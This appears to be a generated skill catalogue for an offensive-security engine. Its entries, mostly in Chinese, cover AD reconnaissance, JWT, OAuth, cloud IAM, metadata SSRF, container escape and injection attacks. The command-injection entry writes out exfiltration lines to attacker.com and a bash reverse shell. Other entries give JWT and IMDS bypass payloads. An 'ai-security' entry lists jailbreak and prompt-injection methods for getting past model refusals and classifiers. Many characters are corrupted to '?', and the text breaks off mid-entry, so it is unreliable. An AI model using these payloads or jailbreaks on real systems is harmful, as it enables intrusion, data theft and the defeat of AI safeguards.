# HOS-Sec-Engine Skill References

> Complete technical reference for all loaded skills.
>
> Generated on 2026-06-20
> Total skills: 28

## Table of Contents

- [ad](#ad)
  - [Active Directory Domain Enumeration and Reconnaissance](#ad-domain-enum-001)
- [ai-security](#ai-security)
  - [Prompt Injection Bypass Techniques](#ai-prompt-injection-001)
- [api](#api)
  - [GraphQL Injection Detection and Exploitation](#api-graphql-injection-001)
  - [IDOR Detection and Exploitation](#api-idor-001)
  - [JWT Attack and Bypass Techniques](#api-jwt-001)
  - [OAuth Flow Attack Techniques](#api-oauth-001)
  - [Rate Limit Bypass Techniques](#api-ratelimit-001)
- [cloud](#cloud)
  - [IAM Privilege Escalation Techniques](#cloud-iam-001)
  - [Cloud Metadata SSRF Exploitation](#cloud-meta-001)
  - [S3/OSS Bucket Misconfiguration Exploitation](#cloud-s3-001)
- [code-review](#code-review)
  - [Java Deserialization Vulnerability Code Audit](#code-review-java-deser-001)
- [container](#container)
  - [Docker Container Escape Techniques](#container-docker-escape-001)
- [web](#web)
  - [Web Authentication Bypass 0day](#web-auth-bypass-0day)
  - [Web Deserialization 0day](#web-deser-0day)
  - [Web WAF Bypass 0day](#web-waf-bypass-0day)
  - [Web XSS Filter 0day](#web-xss-0day)
  - [Insecure Deserialization Exploitation](#web-deser-001)
  - [Command Injection Techniques](#web-rce-001)
  - [SQL Injection WAF Bypass Techniques](#web-sqli-001)
  - [SSRF Detection and Exploitation](#web-ssrf-001)
  - [Test Verification Skill](#test-verify-001)
  - [File Upload Restriction Bypass](#web-upload-001)
  - [XSS Filter Bypass Techniques](#web-xss-001)
  - [XXE Injection Techniques](#web-xxe-001)
- [kubernetes](#kubernetes)
  - [Kubernetes Cluster Misconfiguration Exploitation](#k8s-misconfig-001)
- [linux](#linux)
  - [Linux Privilege Escalation Techniques](#linux-priv-esc-001)
- [mobile](#mobile)
  - [Android APK Reverse Engineering and Security Analysis](#mobile-android-apk-001)
- [windows](#windows)
  - [Windows Privilege Escalation Techniques](#windows-priv-esc-001)

---

## ad

**Skills:** 1

### Active Directory Domain Enumeration and Reconnaissance

| Property | Value |
|----------|-------|
| ID | `ad-domain-enum-001` |
| Category | ad |
| Sub-Category | domain-enumeration |
| Risk Level | high |
| Confidence | 0.92 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | active-directory, domain, enumeration, reconnaissance, ldap, kerberos |

**Triggers:**

- 成功获取域内主机访问权限后需要收集域信息
- 需要绘?AD 域拓扑结构和信任关系
- 寻找域管理员和特权账
- 发现域内服务账号和委派配
- 需要识别域内潜在的攻击路径

**Techniques:**

- LDAP 查询枚举
- Kerberos 用户枚举
- PowerShell AD 模块查询
- BloodHound 数据收集
- SPN 扫描
- GPO 分析
- ACL/ACE 权限分析
- 域信任关系枚?

**Root Causes:**

- AD 默认配置允许匿名 LDAP 查询部分信息
- 域用户具有读取大部分 AD 对象的权
- Kerberos 协议设计允许枚举 SPN
- PowerShell 内置 AD 模块可查询域信息

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

---

## ai-security

**Skills:** 1

### Prompt Injection Bypass Techniques

| Property | Value |
|----------|-------|
| ID | `ai-prompt-injection-001` |
| Category | ai-security |
| Sub-Category | prompt-injection |
| Risk Level | high |
| Confidence | 0.88 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | ai, prompt-injection, llm, bypass, jailbreak |

**Triggers:**

- AI 系统对输入内容进行安全过滤，需要绕过内容审
- 大语言模型拒绝执行某些指令
- 需要测?AI 系统的安全边
- 评估 AI 应用?prompt 安全防护能力

**Techniques:**

- 角色扮演注入：将模型设定为不受限制的角色
- 假设场景注入：在虚构场景中绕过限
- 间接注入：通过外部引用内容间接传递指
- 编码绕过：使?Base64、ROT13、Unicode 等编
- 翻译链绕过：多语言翻译后回原始语言
- 多轮渐进：分多步对话逐步解除限制
- 分割注入：将敏感指令拆分为多个无害部?

**Root Causes:**

- 系统提示?(system prompt) 设定了安全边
- 模型经过安全对齐训练 (RLHF/RLAIF)
- 输入内容触发了内容分类器的风险标?

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

---

## api

**Skills:** 5

### GraphQL Injection Detection and Exploitation

| Property | Value |
|----------|-------|
| ID | `api-graphql-injection-001` |
| Category | api |
| Sub-Category | graphql |
| Risk Level | high |
| Confidence | 0.85 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | graphql, injection, api, introspection, dos, batching |

**Triggers:**

- 目标 API 使用 GraphQL 端点（/graphql, /graphiql, /api/graphql）
- 存在 GraphQL introspection 查询可获取完整 schema
- GraphQL 查询中用户输入未经过滤直接拼接到 resolver 逻辑
- 支持批量查询（batching）可能导致 DoS 或权限绕过

**Techniques:**

- Introspection 查询获取完整 schema
- 嵌套查询深度攻击（depth-first DoS）
- Alias 批量绕过字段限制
- Batch query 绕过速率限制
- Resolver 层 SQL/NoSQL 注入测试

**Root Causes:**

- GraphQL introspection 在生产环境未禁用
- Resolver 层未对用户输入进行安全校验
- 查询复杂度限制（depth/complexity）未配置
- 字段级权限控制依赖客户端而非服务端

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

### IDOR Detection and Exploitation

| Property | Value |
|----------|-------|
| ID | `api-idor-001` |
| Category | api |
| Sub-Category | idor |
| Risk Level | high |
| Confidence | 0.9 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | idor, access-control, bola, authorization, parameter-tampering, enumeration, privilege-escalation |

**Triggers:**

- API 端点使用数字 ID、UUID/GUID 或用户名作为对象引用参数
- URL 路径包含资源标识符：/api/users/123/orders?api/documents?id=456
- 请求参数中包含当前用户的 ID 或其他用户可推测的标识符
- 批量操作 API 支持传入多个资源 ID
- GraphQL 查询中通过 ID 参数获取对象
- API 响应中包含其他用户的资源 ID 或敏感数
- 分页 API 返回大量资源列表，可通过遍历获取未授权数?

**Techniques:**

- 顺序 ID 枚举：id=100, 101, 102... 遍历相邻资源
- UUID/GUID 枚举：从公开接口或响应中收集 UUID，交叉访
- 参数篡改：修改请求体/查询参数中的 owner_id、account_id、user_id
- HTTP 方法变更：GET 有权限检查但 POST/PUT/DELETE 没有
- 间接引用映射绕过：解?重编码间?ID，访问映射对
- GraphQL ID 注入：在查询中替?ID 字段为其他用户资?ID
- 批量 IDOR：在数组参数中添加他人资?ID
- 多租户越权：修改 tenant_id ?organization_id 跨租户访?

**Root Causes:**

- API 端点仅验证用户是否已认证（token 有效），未验证用户是否有权访问特定资
- 开发者假设用户不会修?URL 参数或使用难以猜测的 UUID，忽视授权检
- 对象所有权关系未在数据库查询中体现（缺?WHERE owner_id = ? 条件
- 间接引用映射（间?ID）未在服务端验证映射关系
- GraphQL schema 未实施字段级和对象级权限控制
- 批量 API 未逐个验证每个资源 ID 的访问权
- 微服务架构中，认证和授权分离，授权检查被遗漏
- API 版本迭代时新端点未继承原有权限检查逻辑

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

### JWT Attack and Bypass Techniques

| Property | Value |
|----------|-------|
| ID | `api-jwt-001` |
| Category | api |
| Sub-Category | jwt |
| Risk Level | critical |
| Confidence | 0.92 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | jwt, token, authentication, algorithm-confusion, none-algorithm, key-injection, claim-manipulation |

**Triggers:**

- 目标 API 使用 JWT (JSON Web Token) 进行身份认证或授
- Authorization: Bearer <token> 请求头中包含 JWT
- Cookie 中存?JWT 用于会话管理
- URL 参数中传?JWT token
- OAuth/OIDC 流程中使?JWT 作为 id_token ?access_token
- 微服务间使用 JWT 进行服务间认?

**Techniques:**

- none 算法攻击：{"alg":"none","typ":"JWT"} ?移除签名部分
- 算法混淆攻击：RS256 转HS256，用公钥作为 HMAC-SHA256 密钥
- 弱密钥爆破：使用字典或规则攻击HS256 secret
- kid 路径遍历：kid = "../../config/jwt-secret"
- kid SQL 注入：kid = "key1' OR 1=1--"
- jku/x5u 控制：指定攻击者控制的 JWK URL
- 声明篡改：修?role、isAdmin、scope 等权限声
- 过期时间操纵：设?exp 为极远未来时间或移除 exp
- token 重放：使用已撤销或过期的 token 访问 API
- 跨服务复用：利用相同密钥在不同服务间重放 token

**Root Causes:**

- JWT 库默认支?"none" 算法且服务端未显式禁
- RS256/HS256 算法混淆：服务端使用公钥验证签名时，若攻击者将 alg 改为 HS256，服务端会用公钥作为 HMAC 密钥验证签名
- JWT secret 使用弱密码（短长度、常见字典词），可被暴力破解
- kid (Key ID) 参数未经严格校验，存在路径遍历、SQL 注入、命令注入风
- 服务端未验证 token 过期时间 (exp) 或在验证失败时回退到不安全的默认行
- jku/x5u 参数允许指定外部密钥 URL，攻击者可控制密钥来源
- 服务端使用对称签?(HS256) 但密钥硬编码在客户端代码或公开配置
- 未验?issuer (iss) ?audience (aud) 声明，导?token 可跨服务复用

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

### OAuth Flow Attack Techniques

| Property | Value |
|----------|-------|
| ID | `api-oauth-001` |
| Category | api |
| Sub-Category | oauth |
| Risk Level | critical |
| Confidence | 0.91 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | oauth, oauth2, oidc, authorization-code, csrf, token-theft, redirect-uri, pkce, state-parameter, implicit-grant |

**Triggers:**

- 目标应用使用 OAuth 2.0 ?OpenID Connect (OIDC) 进行第三方登录或 API 授权
- 存在 "Login with Google/GitHub/Facebook" 等社交登录按
- API 使用 OAuth access_token ?OIDC id_token 进行认证
- OAuth 授权码流程（Authorization Code Flow）用?Web 或移动应
- 隐式授权流程（Implicit Grant）用于单页应?(SPA)
- 设备授权流程（Device Authorization）用?IoT 或无浏览器设
- 客户端凭证流程（Client Credentials）用于服务间通信

**Techniques:**

- 授权码拦截：截获 authorization code 并在攻击者客户端兑换 token
- redirect_uri 操纵：将回调地址指向攻击者控制的服务
- state 参数 CSRF：缺?state 时构造恶?OAuth 链接强制用户登录攻击者账
- Referer ?token 泄露：诱导用户从?token 的页面跳转到攻击者站
- Implicit Grant token 盗窃：从 URL fragment 中获?access_token
- PKCE 绕过：不发?code_verifier 或使用弱 code_challenge_method
- Scope 提升：请求超出预期的 scope 获取更高权限
- Token 重放：使用过期或已撤销?token 访问 API
- OIDC id_token 伪造：跳过签名验证接受伪造的身份声明
- OAuth 开放重定向：利?redirect_uri 参数将用户重定向到恶意站?

**Root Causes:**

- redirect_uri 参数未严格白名单校验，允许攻击者控制回调地址
- state 参数未生成、未验证或可预测，无法防?CSRF 攻击
- 授权?(authorization code) 未绑定客户端或会话，可被跨客户端使用
- PKCE (Proof Key for Code Exchange) 未实施或 code_verifier 未验
- Implicit Grant ?token 暴露?URL 中，可被浏览器历史、Referer、日志捕
- token 通过不安全的传输方式（HTTP 而非 HTTPS）传
- OAuth 客户端密?(client_secret) 硬编码在客户端代码中
- Scope 验证缺失，token 可访问超出授权范围的数据
- OIDC id_token 未验?signature ?aud (audience) 声明

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

### Rate Limit Bypass Techniques

| Property | Value |
|----------|-------|
| ID | `api-ratelimit-001` |
| Category | api |
| Sub-Category | rate-limit |
| Risk Level | high |
| Confidence | 0.89 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | rate-limit, rate-limit-bypass, brute-force, ip-spoofing, x-forwarded-for, token-bucket, api-abuse, graphql-batching, enumeration |

**Triggers:**

- 目标 API 对登录、注册、密码重置等接口实施了速率限制
- API 返回 429 Too Many Requests 响应
- 响应头中包含速率限制信息：X-RateLimit-Limit、X-RateLimit-Remaining、Retry-After
- 需要暴力破解密码、OTP、API key 或验证码
- 需要大量爬?API 数据或枚举资
- GraphQL API 对查询深度或复杂度有限制
- API 对每?API key 或用户账户有调用次数限制
- 分布式系统使?API Gateway 实施速率限制

**Techniques:**

- X-Forwarded-For 伪造：添加或修?X-Forwarded-For 请求头伪造不?IP
- IP 轮换：使用代理池、Tor 网络、云服务实例轮换?IP
- HTTP 方法变异：使用不?HTTP 方法访问同一资源
- 端点枚举：利?API 端点变体绕过特定端点的速率限制
- 并行请求竞赛：在速率限制计数器更新前发送多个请
- GraphQL batching：在单个请求中包含多个查?变更
- GraphQL nesting：嵌套查询绕过基于请求数的限
- 时序攻击：利用固定窗口算法在窗口边界加倍请
- API key 枚举：尝试多?API key 分担速率限制
- User-Agent 轮换：使用不?User-Agent 绕过基于 UA 的速率限制
- Cookie/Session 轮换：使用不同会话绕过基于会话的速率限制
- 协议切换：HTTP ?WebSocket ?gRPC 绕过 HTTP 层速率限制

**Root Causes:**

- 速率限制仅基?IP 地址，可通过代理?X-Forwarded-For 绕过
- 速率限制未考虑 IPv6 地址空间，可使用不同 IPv6 地址绕过
- API Gateway 和后端服务的速率限制不一致，可通过直接访问后端绕过
- 速率限制计数器在分布式系统中未正确同步，可跨节点规避
- 速率限制基于客户端可伪造的 HTTP 头（X-Forwarded-For、X-Real-IP
- 速率限制仅应用于特定端点，其他端点或 HTTP 方法未被限制
- GraphQL batching/nesting 未计入速率限制
- 速率限制时间窗口实现有缺陷（如固定窗口而非滑动窗口
- 速率限制?CDN/WAF 层实施，源站未实施，可绕?CDN 直接访问

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

---

## cloud

**Skills:** 3

### IAM Privilege Escalation Techniques

| Property | Value |
|----------|-------|
| ID | `cloud-iam-001` |
| Category | cloud |
| Sub-Category | iam |
| Risk Level | critical |
| Confidence | 0.93 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | iam, privilege-escalation, iam-passrole, create-policy-version, assume-role, lambda-role, credential-abuse, resource-based-policy, aws, iam-policy, sts, role-chain, policy-injection |

**Triggers:**

- 已获?AWS IAM 用户的低权限凭证（AccessKey/SecretKey），需要提升到管理员权
- 目标 IAM 用户附加了多?managed policy ?inline policy，可能存在权限重叠或遗漏
- 发现目标允许 iam:PassRole 权限，可尝试通过服务角色提升权限
- 目标 IAM policy 允许 iam:CreatePolicyVersion 且未限制 set-as-default
- 存在跨账户信任关系，可通过 sts:AssumeRole 进行角色链攻
- Lambda 函数配置了高权限执行角色，可通过修改函数代码以该角色执行
- 发现 IAM 凭证泄露（GitHub 泄露、配置文件泄露、日志泄露）
- 资源基础策略（Resource-based Policy）中存在宽松?Principal 配置

**Techniques:**

- iam:CreatePolicyVersion ?创建策略新版本并设为默认，直接修改策略权
- iam:PassRole + lambda:CreateFunction ?创建 Lambda 函数以高权限角色执行代码
- iam:PassRole + ec2:RunInstances ?创建 EC2 实例以高权限角色执行命令
- iam:PassRole + glue:CreateJob ?创建 Glue Job 以高权限角色执行代码
- sts:AssumeRole ?直接担任更高权限的角
- iam:PutUserPolicy ?添加 inline policy 到当前用
- iam:AttachUserPolicy ?附加 managed policy 到当前用
- iam:UpdateLoginProfile ?修改其他用户的控制台密码
- iam:CreateAccessKey ?为高权限用户创建新的 AccessKey
- iam:AddUserToGroup ?将当前用户加入高权限
- 资源基础策略注入 ?修改 S3 bucket policy ?Lambda resource policy 放宽权限
- 角色链提??通过多个账户间的 AssumeRole 形成角色
- Lambda Layer 注入 ?创建包含恶意代码?Lambda Layer 并附加到目标函数

**Root Causes:**

- 管理员使用通配符权限（?"Action": "iam:*"）而非最小权限原
- 策略中缺?Condition 限制，允许无约束?iam:CreatePolicyVersion
- iam:PassRole 权限未限制具体的角色 ARN 或服务（"Resource": "*"
- sts:AssumeRole 信任策略未限制外部账户（允许任意账户 assume
- Lambda 函数创建时使用了高权限角色，且函数代码用户可
- 资源基础策略未正确验?Principal，导致跨账户权限泄露
- IAM policy 版本管理：CreatePolicyVersion 最多允?5 个版本，攻击者可创建新版本覆盖原有策
- Service Control Policies (SCP) 未正确配置，无法阻止权限提升操作

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

### Cloud Metadata SSRF Exploitation

| Property | Value |
|----------|-------|
| ID | `cloud-meta-001` |
| Category | cloud |
| Sub-Category | metadata |
| Risk Level | critical |
| Confidence | 0.94 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | ssrf, metadata, imdsv1, imdsv2, cloud-metadata, iam-credentials, user-data, aws, gcp, azure, token-bypass, container-metadata, instance-identity, 169.254.169.254 |

**Triggers:**

- 目标应用部署?AWS EC2、GCP Compute Engine、Azure VM 等云实例
- 应用存在 SSRF 漏洞（URL 参数控制后端 HTTP 请求目标
- 应用在容器环境（Docker、Kubernetes）中运行，可访问容器元数
- 应用存在 URL 预览、图片代理、Webhook 回调、PDF 生成等功
- 云实例未启用 IMDSv2 ?hop limit 设置大于 1
- 应用使用?SDK 自动从元数据获取凭证
- 存在模板注入或命令注入，可发?HTTP 请求到元数据端点

**Techniques:**

- IMDSv1 直接访问：无需认证，GET 请求即可获取元数
- IMDSv2 token 获取：PUT /latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
- IP 编码绕过?xA9FEA9FE（十六进制）?852039166（十进制）、[0:0:0:0:0:ffff:a9fe:a9fe]（IPv6
- URL 解析绕过：http://169.254.169.254.nip.io（DNS 解析?169.254.169.254
- 重定?SSRF：外部服务器 302 ?169.254.169.254 绕过 WAF
- CRLF 注入：在 URL 中注?
 添加自定?header（如 IMDSv2 token header
- gopher 协议：gopher://169.254.169.254:80/_{PUT_request} 获取 IMDSv2 token
- SSRF-XXE 组合：通过 XXE 发起请求到元数据端点
- 容器元数据：ECS 通过 AWS_CONTAINER_CREDENTIALS_RELATIVE_URI 获取端点
- Kubernetes：通过 SSRF 访问 kubelet API 获取 Pod 信息?service account token

**Root Causes:**

- 应用信任用户输入?URL 参数，未过滤内网地址（特别是 169.254.169.254
- 云实例管理员未启?IMDSv2 或未设置 hop-limit=1
- IAM 角色附加了过宽的权限（如 AdministratorAccess），一旦被利用危害极大
- user-data 脚本中硬编码了敏感信息（密钥、密码、API token
- 应用使用旧版 SDK 或自定义 HTTP 客户端，不支?IMDSv2
- 容器编排平台（Kubernetes）中 kubelet API 未启用认
- 反向代理（如 Nginx）配置不当，?metadata 请求转发到后?

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

### S3/OSS Bucket Misconfiguration Exploitation

| Property | Value |
|----------|-------|
| ID | `cloud-s3-001` |
| Category | cloud |
| Sub-Category | s3 |
| Risk Level | critical |
| Confidence | 0.92 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | s3, oss, bucket-misconfiguration, public-bucket, cloud-storage, acl-abuse, policy-bypass, data-exposure, aws, alibaba-cloud, cloudfront-oai, file-upload |

**Triggers:**

- 目标使用 AWS S3、阿里云 OSS、腾讯云 COS 等云存储服务作为静态资源托
- Web 应用从云存储桶加载前端资源（JS/CSS/图片），URL 中包?bucket 名称
- 应用允许用户上传文件到云存储桶，且未严格校验上传路径和文件类
- 发现 bucket 域名格式?{bucket}.s3.amazonaws.com ?{bucket}.oss-cn-hangzhou.aliyuncs.com
- 前端代码硬编码了 S3/OSS bucket URL 或使用了 SDK 直传
- CloudFront/OSS CDN 回源?S3/OSS bucket，可能存?OAI 绕过
- CI/CD 流水线将构建产物或配置文件上传到云存储桶

**Techniques:**

- DNS 枚举发现 S3 bucket：使用工具如 slurp、s3scanner、BucketFinder
- S3 列举绕过：当 ListBucket 被拒时，通过已知文件名模式猜测对象路
- ACL 直接修改：当?PutBucketAcl 权限时，可修?bucket 为公开访问
- bucket policy 注入：当?PutBucketPolicy 权限时，可添加允许自己的策略
- CloudFront OAI 绕过：直接通过 S3 端点访问绕过 CloudFront ?OAI 限制
- 签名 URL 伪造：如果获取到签名算法参数，可自行生成有效签?URL
- STS 凭证滥用：利用泄露的 STS 临时凭证操作 bucket
- 预签?URL 上传：利用服务端生成的预签名 URL 直接上传文件?bucket
- 子域名接管：删除 bucket 后如?Route53 记录未删除，可注册同?bucket 接管流量
- 阿里?OSS 公共 bucket 直接下载：ossutil cp oss://{bucket}/path/to/file ./local

**Root Causes:**

- 开发者创?bucket 时误设为 "Public Read/Write" ?"Public Access" 以方便开发调试，上线后未收回
- 使用 AWS 管理控制台创?bucket 时默?ACL 策略不当?023?月前 S3 默认关闭公共访问，但已有 bucket 不受影响
- bucket policy 中错误地设置了宽松的 Condition 条件，导致权限控制形同虚
- 使用第三方工具（?s3cmd、aws-cli）配?bucket 时参数错
- 阿里?OSS "Block Public Access" 功能未启用，bucket ACL 默认?private 但被手动改为 public-read
- CloudFront OAI 配置后未移除 S3 bucket 上的 public read 权限，导?OAI 绕过
- IAM 策略?s3:* 权限过宽，允许任?IAM 用户修改 bucket policy ?ACL
- 对象标签 (object tagging) 或基于标签的访问控制配置错误

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

---

## code-review

**Skills:** 1

### Java Deserialization Vulnerability Code Audit

| Property | Value |
|----------|-------|
| ID | `code-review-java-deser-001` |
| Category | code-review |
| Sub-Category | java-deserialization |
| Risk Level | critical |
| Confidence | 0.93 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | java, deserialization, code-audit, rce, gadget-chain, ysoserial |

**Triggers:**

- 代码审计中发?Java 反序列化入口
- 应用使用 ObjectInputStream.readObject()
- 发现不安全的反序列化库配
- 需要识?gadget chain 可利用的依赖
- 发现 RMI/JMX 接口暴露

**Techniques:**

- 静态代码搜索反序列化入口点
- 依赖版本分析 (Maven/Gradle)
- Gadget chain 匹配分析
- ysoserial 生成 PoC
- 动态调试验证反序列化流
- 使用 SerialKiller 进行防护验证

**Root Causes:**

- ObjectInputStream.readObject() 未验证输入来
- 使用了包含危?gadget 的第三方
- 自定?readObject() 方法执行危险操作
- XML/JSON 反序列化库配置不安全
- RMI 注册表未绑定安全策略

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

---

## container

**Skills:** 1

### Docker Container Escape Techniques

| Property | Value |
|----------|-------|
| ID | `container-docker-escape-001` |
| Category | container |
| Sub-Category | docker-escape |
| Risk Level | critical |
| Confidence | 0.9 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | docker, container-escape, privilege-escalation, namespace, cgroup |

**Triggers:**

- 成功获取容器 shell 后需要逃逸到宿主
- 容器以特权模?(--privileged) 运行
- 容器挂载了宿主机敏感目录
- 容器使用了不安全?Capability 配置
- Docker socket 被挂载到容器?

**Techniques:**

- 特权模式逃逸：挂载宿主机根文件系统
- Docker socket 逃逸：通过 API 创建特权容器
- cgroup release_agent 逃
- CVE-2019-5736 runc 逃
- 危险 Capability 利用 (SYS_MODULE 加载内核模块)
- procfs 逃?(通过 /proc 访问宿主机进?

**Root Causes:**

- 特权模式 (--privileged) 授予所?Linux Capability
- Docker socket 挂载使容器可控制宿主?Docker daemon
- 危险 Capability 配置不当
- 宿主机内核存在容器逃逸相关漏?(CVE-2019-5736 ?
- 不安全的 cgroup 配置允许 release_agent 利用

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

---

## web

**Skills:** 12

### Web Authentication Bypass 0day

| Property | Value |
|----------|-------|
| ID | `web-auth-bypass-0day` |
| Category | web |
| Sub-Category | authentication |
| Risk Level | critical |
| Confidence | 0.7 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | authentication, bypass, 0day, login, session, token |

**Triggers:**

- TODO: 由 AI 自主维护更新 - 填入最新认证绕过 0day 的触发场景
- 示例: 目标使用最新版本的 JWT/OAuth/Session 认证，存在未公开的绕过方式

**Techniques:**

- TODO: 由 AI 自主维护更新 - 填入技术手段

**Root Causes:**

- TODO: 由 AI 自主维护更新 - 填入根因分析

**Quality:**

- Reviewed: No
- Tested: No
- Last Verified: 2026-06

---

### Web Deserialization 0day

| Property | Value |
|----------|-------|
| ID | `web-deser-0day` |
| Category | web |
| Sub-Category | deserialization |
| Risk Level | critical |
| Confidence | 0.7 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | deserialization, 0day, rce, gadget-chain, java, php, python |

**Triggers:**

- TODO: 由 AI 自主维护更新 - 填入最新反序列化 0day 的触发场景
- 示例: 目标使用最新版本的序列化库，存在未公开的 gadget chain

**Techniques:**

- TODO: 由 AI 自主维护更新 - 填入技术手段

**Root Causes:**

- TODO: 由 AI 自主维护更新 - 填入根因分析

**Quality:**

- Reviewed: No
- Tested: No
- Last Verified: 2026-06

---

### Web WAF Bypass 0day

| Property | Value |
|----------|-------|
| ID | `web-waf-bypass-0day` |
| Category | web |
| Sub-Category | waf-bypass |
| Risk Level | high |
| Confidence | 0.7 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | waf, bypass, 0day, firewall, evasion, filter-bypass |

**Triggers:**

- TODO: 由 AI 自主维护更新 - 填入最新 WAF 绕过 0day 的触发场景
- 示例: 目标使用最新版本的 Cloudflare/阿里云 WAF/ModSecurity，存在未公开的绕过技术

**Techniques:**

- TODO: 由 AI 自主维护更新 - 填入技术手段

**Root Causes:**

- TODO: 由 AI 自主维护更新 - 填入根因分析

**Quality:**

- Reviewed: No
- Tested: No
- Last Verified: 2026-06

---

### Web XSS Filter 0day

| Property | Value |
|----------|-------|
| ID | `web-xss-0day` |
| Category | web |
| Sub-Category | xss |
| Risk Level | high |
| Confidence | 0.7 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | xss, 0day, filter-bypass, csp-bypass, dom-xss, stored-xss |

**Triggers:**

- TODO: 由 AI 自主维护更新 - 填入最新 XSS 过滤 0day 的触发场景
- 示例: 目标使用最新的 CSP 策略/WAF XSS 过滤，存在未公开的绕过方式

**Techniques:**

- TODO: 由 AI 自主维护更新 - 填入技术手段

**Root Causes:**

- TODO: 由 AI 自主维护更新 - 填入根因分析

**Quality:**

- Reviewed: No
- Tested: No
- Last Verified: 2026-06

---

### Insecure Deserialization Exploitation

| Property | Value |
|----------|-------|
| ID | `web-deser-001` |
| Category | web |
| Sub-Category | deserialization |
| Risk Level | critical |
| Confidence | 0.91 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | deserialization, insecure-deserialization, ysoserial, php-unserialize, python-pickle, yaml-deserialization, prototype-pollution, rce |

**Triggers:**

- 应用接收序列化的对象数据（Cookie、Session、Token、API 请求体）
- Java 应用使用 ObjectInputStream.readObject() 反序列化用户可控数据
- PHP 应用使用 unserialize() 处理用户输入
- Python 应用使用 pickle.loads() 反序列化不可信数
- Node.js 应用反序列化 JSON 或其他格式数据时存在原型链操
- Ruby/Python YAML 解析器加载不可信 YAML 文档
- 存在基于序列化的 Remember Me、状态恢复、缓存功?

**Techniques:**

- Java ysoserial gadget chain（CommonsCollections、Spring、Jdk7u21 等）
- PHP POP chain（Property Oriented Programming）利用魔术方
- Python pickle REDUCE 操作码执行任意代
- Node.js 原型链污染（__proto__、constructor.prototype
- YAML !!python/object/!!ruby/object 类型标签利用
- .NET BinaryFormatter gadget chain（TypeConfuseDelegate 等）
- Base64 编码序列化数据绕过检
- 序列化数据篡改（修改字段值、类型、类名）
- Gadget chain 版本适配（根据目标库版本选择 chain
- 反序列化 + SSRF 组合利用

**Root Causes:**

- 反序列化用户可控数据且未验证完整
- 序列化格式允许指定对象类型（攻击者可指定任意类）
- 类路径中存在可利用的 gadget（可被链式调用实?RCE 的类和方法）
- PHP 魔术方法（__wakeup、__destruct、__toString）在反序列化时自动调
- Python pickle 设计允许执行任意操作
- YAML 加载器支持语言特定类型?!python/object
- Node.js JSON.parse 后对象原型链被污染影响后续逻辑

---

### Command Injection Techniques

| Property | Value |
|----------|-------|
| ID | `web-rce-001` |
| Category | web |
| Sub-Category | command-injection |
| Risk Level | critical |
| Confidence | 0.93 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | command-injection, os-command-injection, rce, blind-command-injection, dns-exfiltration, filter-bypass |

**Triggers:**

- 应用调用系统命令处理用户输入（如 ping、nslookup、tracert、convert、ffmpeg
- 存在网络诊断工具（ping 测试、端口扫描、DNS 查询
- 应用使用 system()、exec()、popen()、Runtime.exec() 等函
- 文件处理功能调用外部程序（图像处理、文档转换、压缩解压）
- 存在代码执行功能（在线编辑器、代码沙箱、REPL
- 应用调用 shell 脚本或批处理文件处理用户数据

**Techniques:**

- 命令分隔符注入：; | || && $(cmd) `cmd`
- 盲注时间延迟：sleep 5（Linux）、ping -n 5 127.0.0.1（Windows/Linux
- DNS exfiltration?(whoami).attacker.com ?`whoami`.attacker.com
- 空格绕过?{IFS}??09、{cmd,arg}?IFS$9
- 引号绕过：使用变量拼接、hex 编码、base64 编码
- 关键字绕过：字符拼接（a=ca;b=t;$a$b /etc/passwd
- 编码绕过：base64 解码执行（echo xxx | base64 -d | bash
- HTTP exfiltration：curl http://attacker.com/$(whoami)
- 反向 shell：bash -i >& /dev/tcp/attacker.com/4444 0>&1
- PowerShell 命令注入（Windows）：-EncodedCommand base64

**Root Causes:**

- 使用不安全的函数执行系统命令（system、exec、shell_exec、popen
- 用户输入直接拼接到命令字符串中，未使用参数化调用
- 黑名单过滤不完整（遗漏命令分隔符、管道符、重定向符）
- 对命令执行结果未做适当隔离，部分输出返回给用户
- 应用以高权限运行（root/Administrator），放大命令注入影响
- 外部程序调用时未限制参数范围

**Quality:**

- Reviewed: Yes
- Tested: Yes
- Last Verified: 2026-06

---

### SQL Injection WAF Bypass Techniques

| Property | Value |
|----------|-------|
| ID | `web-sqli-001` |
| Category | web |
| Sub-Category | sql-injection |
| Risk Level | critical |
| Confidence | 0.92 |
| Author | HOS-Sec-Engine |
| Updated | 2026-06 |
| Tags | sqli, waf-bypass, injection, filter-evasion, sql-payload |

**Triggers:**

